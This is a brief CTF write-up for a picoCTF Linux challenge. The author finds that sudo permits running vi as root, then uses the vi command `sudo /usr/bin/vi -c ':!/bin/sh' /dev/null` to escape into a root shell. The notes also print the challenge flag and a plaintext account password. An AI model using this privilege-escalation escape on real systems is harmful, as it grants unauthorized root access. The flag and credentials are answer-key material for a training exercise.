https://play.picoctf.org/practice/challenge/363?category=5&page=3

- [[Linux]] system, so [[Linux Permissions]]
- `sudo -l` to check permissions
```
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```
- we can use [[vi]]
- run `sudo vi test` to open up vi
- based on [[Good Links#^d81b34]], we can use `sudo /usr/bin/vi -c ':!/bin/sh' /dev/null` to get a interactive shell
- running the command we can see we have accessed root with [[whoami]]
```
# whoami
root
```
- go into challenge folder and read the json file
```
# cd challenge
# ls
metadata.json
# cat metadata.json
{"flag": "picoCTF{uS1ng_v1m_3dit0r_55878b51}", "username": "picoplayer", "password": "yX-YQgX-vS"}
```